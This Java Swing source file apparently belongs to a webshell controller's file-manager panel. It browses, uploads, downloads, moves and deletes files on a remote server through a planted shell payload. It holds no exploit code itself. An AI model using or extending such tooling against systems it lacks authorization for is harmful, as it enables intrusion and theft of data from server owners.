package core.ui.component;

import core.ApplicationContext;
import core.Encoding;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.dialog.FileDialog;
import core.ui.component.model.FileOpertionInfo;
import core.ui.imp.ActionDblClick;
import util.Log;
import util.automaticBindClick;
import util.functions;

import javax.swing.*;
import javax.swing.tree.DefaultMutableTreeNode;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Vector;

public class ShellFileManager extends JPanel {
    private final ShellEntity shellEntity;
    private final Payload payload;
    private final Encoding encoding;
    private JScrollPane filelJscrollPane;
    private DataTree fileDataTree;
    private JPanel filePanel;
    private JPanel fileOpertionPanel;
    private DefaultMutableTreeNode rootTreeNode;
    private JScrollPane dataViewSplitPane;
    private JScrollPane toolSplitPane;
    private DataView dataView;
    private ShellRSFilePanel rsFilePanel;
    private JPanel dataViewPanel;
    private JPanel toolsPanel;
    private JButton uploadButton;
    private JButton moveButton;
    private JButton copyFileButton;
    private JButton copyNameButton;
    private JButton deleteFileButton;
    private JButton newFileButton;
    private JButton newDirButton;
    private JButton refreshButton;
    private JButton downloadButton;
    private JTextField dirField;
    private JPanel dirPanel;
    private JSplitPane jSplitPane1;
    private JSplitPane jSplitPane2;
    private JSplitPane jSplitPane3;
    private Vector<String> dateViewColumnVector;
    private ImageIcon dirIcon;
    private ImageIcon fileIcon;
    private String currentDir;

    public ShellFileManager(ShellEntity entity) {
        this.shellEntity = entity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        this.setLayout(new BorderLayout(1, 1));
        this.InitJPanel();
        this.InitEvent();
        this.updateUI();
        this.init(this.shellEntity);
    }

    public void init(ShellEntity shellEntity) {
        String[] fileRoot = this.payload.listFileRoot();

        for (String s : fileRoot) {
            this.fileDataTree.AddNote(s);
        }

        this.currentDir = functions.formatDir(this.payload.currentDir());
        this.dirField.setText(this.currentDir);
        this.fileDataTree.AddNote(this.currentDir);
    }

    private void InitJPanel() {
        this.filePanel = new JPanel();
        this.filePanel.setLayout(new BorderLayout(1, 1));
        this.filelJscrollPane = new JScrollPane();
        this.rootTreeNode = new DefaultMutableTreeNode("Disk");
        this.fileDataTree = new DataTree("", this.rootTreeNode);
        this.fileDataTree.setRootVisible(true);
        this.filelJscrollPane.setViewportView(this.fileDataTree);
        this.filePanel.add(this.filelJscrollPane);
        this.fileOpertionPanel = new JPanel(new CardLayout());
        this.dateViewColumnVector = new Vector<>();
        this.dateViewColumnVector.add("icon");
        this.dateViewColumnVector.add("name");
        this.dateViewColumnVector.add("type");
        this.dateViewColumnVector.add("lastModified");
        this.dateViewColumnVector.add("size");
        this.dateViewColumnVector.add("permission");
        this.dataViewSplitPane = new JScrollPane();
        this.dataViewPanel = new JPanel();
        this.dataViewPanel.setLayout(new BorderLayout(1, 1));
        this.dataView = new DataView(null, this.dateViewColumnVector, 0, 30);
        this.dataViewSplitPane.setViewportView(this.dataView);
        this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
        this.rsFilePanel = new ShellRSFilePanel(this.payload, this.fileOpertionPanel, "dataView");
        this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
        this.dataViewPanel.add(this.fileOpertionPanel);
        this.toolSplitPane = new JScrollPane();
        this.toolsPanel = new JPanel();
        this.uploadButton = new JButton("上传");
        this.refreshButton = new JButton("刷新");
        this.moveButton = new JButton("移动");
        this.copyFileButton = new JButton("复制");
        this.downloadButton = new JButton("下载");
        this.copyNameButton = new JButton("复制绝对路径");
        this.deleteFileButton = new JButton("删除文件");
        this.newFileButton = new JButton("新建文件");
        this.newDirButton = new JButton("新建文件夹");
        this.toolsPanel.add(this.uploadButton);
        this.toolsPanel.add(this.moveButton);
        this.toolsPanel.add(this.refreshButton);
        this.toolsPanel.add(this.copyFileButton);
        this.toolsPanel.add(this.copyNameButton);
        this.toolsPanel.add(this.deleteFileButton);
        this.toolsPanel.add(this.newFileButton);
        this.toolsPanel.add(this.newDirButton);
        this.toolsPanel.add(this.downloadButton);
        this.toolSplitPane.setViewportView(this.toolsPanel);
        this.dirPanel = new JPanel();
        this.dirPanel.setLayout(new BorderLayout(1, 1));
        this.dirField = new JTextField();
        this.dirField.setColumns(100);
        this.dirPanel.add(this.dirField);
        this.dirIcon = new ImageIcon(this.getClass().getResource("/images/folder.png"));
        this.fileIcon = new ImageIcon(this.getClass().getResource("/images/file.png"));
        this.fileDataTree.setLeafIcon(new ImageIcon(this.getClass().getResource("/images/folder.png")));
        this.jSplitPane2 = new JSplitPane();
        this.jSplitPane2.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.jSplitPane2.setTopComponent(this.dataViewPanel);
        this.jSplitPane2.setBottomComponent(this.toolSplitPane);
        this.jSplitPane3 = new JSplitPane();
        this.jSplitPane3.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.jSplitPane3.setTopComponent(this.dirPanel);
        this.jSplitPane3.setBottomComponent(this.jSplitPane2);
        this.jSplitPane1 = new JSplitPane();
        this.jSplitPane1.setOrientation(JSplitPane.HORIZONTAL_SPLIT);
        this.jSplitPane1.setLeftComponent(this.filePanel);
        this.jSplitPane1.setRightComponent(this.jSplitPane3);
        this.add(this.jSplitPane1);
    }

    private void InitEvent() {
        automaticBindClick.bindJButtonClick(this, this);
        this.dataView.setActionDblClick(e -> ShellFileManager.this.dataViewDbClick(e));
        this.fileDataTree.setActionDbclick(e -> ShellFileManager.this.fileDataTreeDbClick(e));
        this.dirField.addKeyListener(new KeyAdapter() {
            public void keyPressed(KeyEvent e) {
                if (e.getKeyChar() == '\n') {
                    ShellFileManager.this.refreshButtonClick(null);
                }

            }
        });
    }

    public void dataViewDbClick(MouseEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String) rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        int fileSize = functions.stringToint((String) rowVector.get(4));
        if (fileType.equals("dir")) {
            this.refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        } else if (fileSize < 1048576) {
            this.rsFilePanel.rsFile(fileNameString);
            ((CardLayout) this.fileOpertionPanel.getLayout()).show(this.fileOpertionPanel, "rsFile");
        } else {
            JOptionPane.showMessageDialog(this, "目标文件大小大于1MB", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    public void fileDataTreeDbClick(MouseEvent e) {
        this.refreshFile(this.fileDataTree.GetSelectFile());
    }

    public void moveButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "reName", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            String srcFileString = fileOpertionInfo.getSrcFileName();
            String destFileString = fileOpertionInfo.getDestFileName();
            boolean state = this.payload.moveFile(srcFileString, destFileString);
            if (state) {
                JOptionPane.showMessageDialog(this, String.format("移动成功  %s >> %s", fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "修改失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    public void copyFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "copy", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            boolean state = this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
            if (state) {
                JOptionPane.showMessageDialog(this, String.format("复制成功  %s <<>> %s", fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "复制失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    public void copyNameButtonClick(ActionEvent e) {
        Vector vector = this.dataView.GetSelectRow();
        if (vector != null) {
            String fileString = functions.formatDir(this.currentDir) + vector.get(1);
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(fileString), null);
            JOptionPane.showMessageDialog(this, "已经复制到剪辑版");
        }

    }

    public void deleteFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String inputFile = JOptionPane.showInputDialog("输入文件名称", fileString);
        if (inputFile != null) {
            boolean state = this.payload.deleteFile(inputFile);
            if (state) {
                JOptionPane.showMessageDialog(this, "删除成功", "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "删除失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            Log.log("用户取消选择.....");
        }

    }

    private String getSelectdFile() {
        String fileString = "";

        try {
            fileString = functions.formatDir(this.currentDir) + this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
        } catch (Exception var3) {
            Log.error(var3);
        }

        return fileString;
    }

    public void newFileButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newFile";
        String inputFile = JOptionPane.showInputDialog("输入文件名称", fileString);
        if (inputFile != null) {
            boolean state = this.payload.newFile(inputFile);
            if (state) {
                JOptionPane.showMessageDialog(this, "新建文件成功", "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "新建文件失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            Log.log("用户取消选择.....");
        }

    }

    public void uploadButtonClick(ActionEvent e) {
        if (ApplicationContext.isGodMode()) {
            this.GUploadFile();
        } else {
            this.UploadFile();
        }

    }

    public void refreshButtonClick(ActionEvent e) {
        this.refreshFile(functions.formatDir(this.dirField.getText()));
    }

    public void downloadButtonClick(ActionEvent e) {
        if (ApplicationContext.isGodMode()) {
            this.GDownloadFile();
        } else {
            this.downloadFile();
        }

    }

    public void newDirButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newDir";
        String inputFile = JOptionPane.showInputDialog("输入文件夹名称", fileString);
        if (inputFile != null) {
            boolean state = this.payload.newDir(inputFile);
            if (state) {
                JOptionPane.showMessageDialog(this, "新建文件夹成功", "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "新建文件夹失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            Log.log("用户取消选择.....");
        }

    }

    private Vector<Vector<java.io.Serializable>> getAllFile(String filePathString) {
        String fileDataString = this.payload.getFile(functions.formatDir(filePathString));
        String[] rowStrings = fileDataString.split("\n");
        Vector<Vector<java.io.Serializable>> rows = new Vector<>();
        if (rowStrings[0].equals("ok")) {
            rows = new Vector<>();
            this.fileDataTree.AddNote(rowStrings[1]);
            this.currentDir = functions.formatDir(rowStrings[1]);
            this.dirField.setText(functions.formatDir(rowStrings[1]));

            for (int i = 2; i < rowStrings.length; ++i) {
                String[] fileTypes = rowStrings[i].split("\t");
                Vector<java.io.Serializable> row = new Vector<>();
                if (fileTypes.length == 5) {
                    if (fileTypes[1].equals("0")) {
                        row.add(this.dirIcon);
                        this.fileDataTree.AddNote(this.currentDir + fileTypes[0]);
                    } else {
                        row.add(this.fileIcon);
                    }

                    row.add(fileTypes[0]);
                    row.add(fileTypes[1].equals("0") ? "dir" : "file");
                    row.add(fileTypes[2]);
                    row.add(fileTypes[3]);
                    row.add(fileTypes[4]);
                    rows.add(row);
                } else {
                    Log.error("格式不匹配 ," + rowStrings[i]);
                }
            }
        } else {
            Log.error(fileDataString);
            Log.error("目标返回异常,无法正常格式化数据!");
            JOptionPane.showMessageDialog(this, fileDataString);
        }

        return rows;
    }

    private synchronized void refreshFile(String filePathString) {
        Vector<Vector<java.io.Serializable>> rowsVector = this.getAllFile(filePathString);
        this.dataView.AddRows(rowsVector);
        this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
        this.dataView.getModel().fireTableDataChanged();
    }

    private void GUploadFile() {
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "upload", "", "");
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            if (fileOpertionInfo.getDestFileName().length() > 0) {
                byte[] data = new byte[0];

                try {
                    FileInputStream fileInputStream = new FileInputStream(fileOpertionInfo.getSrcFileName());
                    data = functions.readInputStream(fileInputStream);
                    fileInputStream.close();
                } catch (FileNotFoundException var4) {
                    Log.error(var4);
                    JOptionPane.showMessageDialog(this, "文件不存在", "提示", JOptionPane.WARNING_MESSAGE);
                } catch (IOException var5) {
                    Log.error(var5);
                    JOptionPane.showMessageDialog(this, var5.getMessage(), "提示", JOptionPane.WARNING_MESSAGE);
                }

                boolean state = this.payload.uploadFile(fileOpertionInfo.getDestFileName(), data);
                if (state) {
                    JOptionPane.showMessageDialog(this, "上传成功", "提示", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this, "上传失败", "提示", JOptionPane.WARNING_MESSAGE);
                }
            } else {
                JOptionPane.showMessageDialog(this, "上传路径为空", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    private void UploadFile() {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        if (selectdFile != null) {
            String uploadFileString = this.currentDir + selectdFile.getName();
            byte[] data = new byte[0];

            try {
                FileInputStream fileInputStream = new FileInputStream(selectdFile);
                data = functions.readInputStream(fileInputStream);
                fileInputStream.close();
            } catch (FileNotFoundException var6) {
                Log.error(var6);
                JOptionPane.showMessageDialog(this, "文件不存在", "提示", JOptionPane.WARNING_MESSAGE);
            } catch (IOException var7) {
                Log.error(var7);
                JOptionPane.showMessageDialog(this, var7.getMessage(), "提示", JOptionPane.WARNING_MESSAGE);
            }

            boolean state = this.payload.uploadFile(uploadFileString, data);
            if (state) {
                JOptionPane.showMessageDialog(this, "上传成功", "提示", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "上传失败", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    private void GDownloadFile() {
        String file = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "download", file, "");
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            if (fileOpertionInfo.getDestFileName().length() > 0) {
                byte[] data;
                data = this.payload.downloadFile(fileOpertionInfo.getSrcFileName());
                boolean state = functions.filePutContent(fileOpertionInfo.getDestFileName(), data);
                if (state) {
                    JOptionPane.showMessageDialog(this, "下载成功", "提示", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this, "下载失败", "提示", JOptionPane.WARNING_MESSAGE);
                }
            } else {
                JOptionPane.showMessageDialog(this, "下载路径为空", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    private void downloadFile() {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        String srcFile = this.getSelectdFile();
        if (srcFile != null && srcFile.trim().length() > 0) {
            if (selectdFile != null) {
                byte[] data;
                data = this.payload.downloadFile(srcFile);
                boolean state = functions.filePutContent(selectdFile, data);
                if (state) {
                    JOptionPane.showMessageDialog(this, "下载成功", "提示", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this, "下载失败", "提示", JOptionPane.WARNING_MESSAGE);
                }
            } else {
                JOptionPane.showMessageDialog(this, "信息填写不完整", "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this, "未选中下载文件", "提示", JOptionPane.WARNING_MESSAGE);
        }

    }
}
